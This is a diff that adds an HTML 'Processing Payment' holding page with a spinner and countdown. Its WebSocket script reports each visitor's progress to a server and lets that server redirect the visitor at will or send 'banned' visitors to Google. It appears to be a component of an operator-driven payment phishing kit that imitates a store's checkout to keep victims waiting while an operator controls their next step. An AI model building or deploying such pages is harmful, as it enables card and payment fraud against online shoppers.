@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { primary: '#2f1321', accent: '#e45b8a' },
+                    fontFamily: { outfit: ['Outfit', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #e45b8a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-[#1a0b13] text-white flex items-center justify-center min-h-screen font-outfit">
+    <div class="text-center p-8 max-w-sm w-full">
+        <img src="https://cdn.salla.sa/wjBYz/jUswOYjAqz2JF3apQD7pIh2dbv7ppfHNsK3g30Rl.jpg"
+            class="h-12 mx-auto mb-12 brightness-0 invert opacity-80" alt="Logo">
+        <div class="loader mx-auto mb-8"></div>
+        <h2 id="statusTitle" class="text-2xl font-bold mb-2">Processing Payment</h2>
+        <p id="statusDesc" class="text-white/60 text-sm mb-8">Please wait while we verify your details...</p>
+        <div class="w-full bg-white/10 rounded-full h-1.5 mb-4 overflow-hidden">
+            <div id="progressBar" class="bg-accent h-full rounded-full transition-all duration-1000 ease-linear"
+                style="width: 0%"></div>
+        </div>
+        <p id="timer" class="text-xs text-white/40 font-mono">20s remaining</p>
+    </div>
+
+    <script>
+        // WebSocket Connection
+        let clientId = localStorage.getItem('aura_client_id');
+        if (!clientId) {
+            clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('aura_client_id', clientId);
+        }
+
+        // AUTO-DETECT: If hosted, use window.location.host. If local file, use localhost:8000
+        const host = window.location.protocol.startsWith('http') ? window.location.host : 'localhost:8000';
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${host}/ws/client/${clientId}`;
+
+        let ws;
+        function connectWS() {
+            ws = new WebSocket(wsUrl);
+            ws.onopen = () => ws.send(JSON.stringify({ event: 'step_update', data: { step: 'loading' } }));
+            ws.onmessage = (e) => {
+                try {
+                    const msg = JSON.parse(e.data);
+                    if (msg.type === 'REDIRECT') window.location.href = msg.url;
+                    else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
+                } catch (err) { }
+            };
+            ws.onclose = () => setTimeout(connectWS, 3000);
+        }
+        connectWS();
+
+        // Visual Timer
+        let duration = 0; // Starts at 0, counts UP to show "Processing time" or counts down? User asked "savoir est ou".
+        // Let's keep 20s countdown but send updates.
+        let timeLeft = 20;
+        const totalDuration = 20;
+
+        setInterval(() => {
+            if (timeLeft > 0) timeLeft--;
+            document.getElementById('timer').textContent = `${timeLeft}s remaining`;
+            document.getElementById('progressBar').style.width = `${((totalDuration - timeLeft) / totalDuration) * 100}%`;
+
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ event: 'timer_update', data: { time: timeLeft } }));
+            }
+        }, 1000);
+    </script>
+</body>
+
+</html>
